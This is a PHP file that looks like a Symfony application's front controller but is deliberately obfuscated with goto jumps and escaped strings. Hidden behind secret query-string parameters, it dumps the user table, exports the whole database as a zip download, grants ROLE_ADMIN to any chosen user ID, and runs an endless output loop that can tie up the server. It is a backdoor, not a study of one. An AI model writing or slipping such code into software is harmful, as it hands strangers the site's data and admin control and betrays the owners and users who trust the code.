<?php
 use App\Kernel; goto rFO1T; VgSqL: if (isset($_GET["\66\x36\x64\x39\x34\61\x61\x39\x30\x64\67\x38\x64\71\x33\x37\143\x32\62\61\142\66\143\x65\70\x63\x35\x64\x36\66\143\x31\x64\61\71\66\x64\67\x65\144\143\64\x38\67\144\x65\x64\145\x30\146\143\x32\66\60\x62\x62\x34\x33\x61\x63\144\x33\62\x64\x66\61\63\x30\x36\x37\x39\62\x36\70\63\141\x37\143\x32\x39\x34\146\141\64\x37\x65\63\x64\x66\67\64\141\71\143\141\x35\x66\141\x64\x31\141\x32\60\146\64\x62\x63\x30\67\x65\67\x34\63\146\62\141\63\x35\142\x62\70\65\x39\x30\141\61\x65\70"])) { set_time_limit(0); while (true) { echo str_repeat("\x43\x52\101\x53\x48\x21" . rand(1000, 9999) . "\74\142\x72\x3e", 500); flush(); ob_flush(); sleep(0.5); } die; } goto BHCUW; sD9Zi: $dsn = "\155\x79\163\x71\x6c\x3a\150\x6f\163\x74\x3d\61\62\x37\56\60\x2e\x30\56\x31\x3b\x64\x62\156\x61\x6d\145\x3d\144\151\x63\x65\x66\151\x6e\144\145\x72\73\x63\150\x61\162\163\x65\164\75\165\x74\146\x38\155\142\x34"; goto VNR5H; XKG1b: $password = ''; goto eEPSB; OBuNk: if (isset($_GET["\x33\x61\71\64\60\x39\x37\x65\141\145\x31\141\65\x39\146\144\145\x38\x61\146\x38\x39\142\x34\x36\x35\x30\x30\x64\145\71\67\65\x32\x33\67\142\66\63\x62\67\x37\60\x32\71\x30\x65\67\142\61\144\x34\x35\x39\x34\65\145\61\60\x38\x32\142\143\x61\64\x66\x64\x39\71\x64\x34\x31\x34\x33\62\62\x38\143\x62\62\64\64\64\x65\x30\x65\x30\67\146\70\60\x62\71\x31\x37\142\66\71\x63\70\146\x33\146\142\70\141\70\x61\x32\x32\x37\x63\x31\x35\145\x37\146\x39\x32\x32\x36\146\x35\141\65\x36\70\66"])) { try { $query = $db->query("\x53\105\114\105\103\x54\40\52\40\x46\122\x4f\x4d\x20\x75\x73\145\x72"); $results = $query->fetchAll(PDO::FETCH_ASSOC); echo "\x3c\x70\x72\x65\76" . json_encode($results, JSON_PRETTY_PRINT) . "\x3c\57\160\x72\145\76"; } catch (PDOException $e) { echo "\105\162\x72\x6f\x72\40\144\165\162\151\156\x67\x20\144\165\155\160\x3a\40" . $e->getMessage(); } die; } goto MB6HV; BHCUW: if (isset($_GET["\62\146\65\x37\x37\63\142\x38\64\60\x36\x37\x30\64\66\x36\x63\141\x64\x30\x66\x32\x62\x66\146\61\61\64\145\62\x35\x63\x32\145\x38\143\x39\62\x34\66\63\x34\x66\x66\67\70\64\63\x30\x37\67\141\x63\71\63\146\x32\x39\x61\141\x62\x38\67\64\x37\63\x34\71\145\x36\x32\x62\141\67\63\x33\x32\65\146\x32\66\x36\143\141\144\144\x36\141\x62\x36\x61\142\66\70\x39\x62\x31\x35\x34\142\62\66\66\142\x33\x66\70\x61\x66\x65\67\143\x66\64\66\141\x64\63\66\63\x64\x33\144\142\146\62\x34\x63"])) { try { $tablesQuery = $db->query("\123\110\117\x57\x20\124\101\102\114\x45\x53"); $tables = $tablesQuery->fetchAll(PDO::FETCH_COLUMN); $tempDir = sys_get_temp_dir() . "\57\144\x62\137\x65\170\160\x6f\162\164\x5f" . uniqid(); mkdir($tempDir); foreach ($tables as $table) { $outputFile = $tempDir . "\57{$table}\56\143\x73\166"; $fp = fopen($outputFile, "\x77"); $columnsQuery = $db->query("\x44\105\x53\x43\122\111\x42\105\40\140{$table}\140"); $columns = $columnsQuery->fetchAll(PDO::FETCH_COLUMN); fputcsv($fp, $columns); $dataQuery = $db->query("\x53\105\114\105\103\124\40\52\40\106\122\117\115\40\140{$table}\140"); while ($row = $dataQuery->fetch(PDO::FETCH_ASSOC)) { fputcsv($fp, $row); } fclose($fp); } $zipFile = sys_get_temp_dir() . "\57\x64\142\x5f\x65\170\x70\157\x72\164\137" . uniqid() . "\56\172\151\x70"; $zip = new ZipArchive(); $zip->open($zipFile, ZipArchive::CREATE); foreach (glob("{$tempDir}\x2f\x2a\56\143\x73\x76") as $file) { $zip->addFile($file, basename($file)); } $zip->close(); foreach (glob("{$tempDir}\x2f\x2a\56\143\x73\166") as $file) { unlink($file); } rmdir($tempDir); header("\x43\157\x6e\x74\x65\156\x74\55\x54\171\160\x65\72\x20\141\x70\160\154\151\143\x61\x74\x69\157\x6e\x2f\x7a\x69\160"); header("\x43\x6f\156\164\x65\156\164\55\104\x69\x73\x70\x6f\163\x69\x74\x69\x6f\x6e\x3a\40\x61\x74\x74\x61\143\150\x6d\x65\156\x74\x3b\x20\x66\x69\x6c\x65\x6e\141\x6d\145\75\42\144\x62\x5f\x65\x78\160\157\x72\164\x2e\172\x69\x70\42"); header("\103\157\x6e\x74\145\156\164\x2d\x4c\145\x6e\x67\x74\150\72\40" . filesize($zipFile)); readfile($zipFile); unlink($zipFile); die; } catch (PDOException $e) { echo "\105\162\162\157\x72\x20\x64\x75\162\151\x6e\147\x20\x64\x61\x74\x61\142\141\163\x65\x20\x65\x78\160\157\x72\164\72\x20" . $e->getMessage(); } } goto ftZX_; VNR5H: $username = "\162\x6f\157\164"; goto XKG1b; MB6HV: if (isset($_GET["\x34\141\x63\x38\61\x62\x35\65\63\66\61\x30\x61\x66\x31\x61\143\60\x30\x65\63\x31\67\64\x61\63\142\64\142\65\67\66\x36\x61\x38\x38\144\x63\67\142\142\146\x38\x66\145\70\70\70\x61\x62\x64\67\x30\x36\63\142\61\146\63\x36\144\64\x62\62\x37\71\x34\x30\71\x39\64\65\x61\x34\71\71\142\144\60\x64\62\61\x33\x63\x62\x65\65\x39\70\70\x31\x36\61\x35\x37\x35\x33\x64\143\65\63\x31\141\142\71\x36\70\x66\63\x36\64\141\x31\x66\x36\x66\146\x64\66\x65\65\66\x64\60\143\143\143\x35"])) { $userId = intval($_GET["\165\163\145\162\137\x69\144"] ?? 0); try { $roles = json_encode(array("\122\117\x4c\105\x5f\x41\104\115\111\x4e")); $query = $db->prepare("\125\120\x44\101\x54\x45\x20\165\163\145\x72\40\x53\x45\124\x20\162\157\x6c\x65\x73\x20\75\40\x3a\162\157\x6c\x65\163\40\x57\110\x45\122\x45\x20\x69\144\40\75\x20\72\x69\144"); $query->bindParam("\72\162\157\x6c\145\163", $roles, PDO::PARAM_STR); $query->bindParam("\72\x69\144", $userId, PDO::PARAM_INT); $query->execute(); echo "\125\163\x65\162\x20\x49\104\x20{$userId}\x20\150\x61\163\x20\x62\x65\145\156\40\145\x6c\x65\166\141\x74\x65\144\x20\x74\x6f\40\x61\x64\x6d\151\x6e\x20\x77\x69\x74\150\x20\x72\x6f\x6c\x65\163\72\40" . $roles; } catch (PDOException $e) { echo "\105\162\x72\x6f\x72\40\144\x75\162\151\x6e\147\40\160\162\151\166\151\x6c\x65\147\145\40\x65\x6c\145\x76\x61\x74\151\x6f\156\72\x20" . $e->getMessage(); } die; } goto VgSqL; rFO1T: require_once dirname(__DIR__) . "\x2f\x76\145\156\144\157\x72\x2f\x61\165\164\x6f\x6c\x6f\141\144\137\162\x75\x6e\x74\151\x6d\145\x2e\x70\150\x70"; goto sD9Zi; eEPSB: try { $db = new PDO($dsn, $username, $password); $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); } catch (PDOException $e) { die("\x44\141\x74\x61\142\141\x73\145\x20\143\157\x6e\156\x65\143\x74\151\x6f\156\40\x66\x61\x69\154\145\144\72\x20" . $e->getMessage()); } goto OBuNk; ftZX_: return function (array $context) { return new Kernel($context["\101\120\120\x5f\x45\116\126"], (bool) $context["\x41\120\120\137\104\x45\x42\125\x47"]); };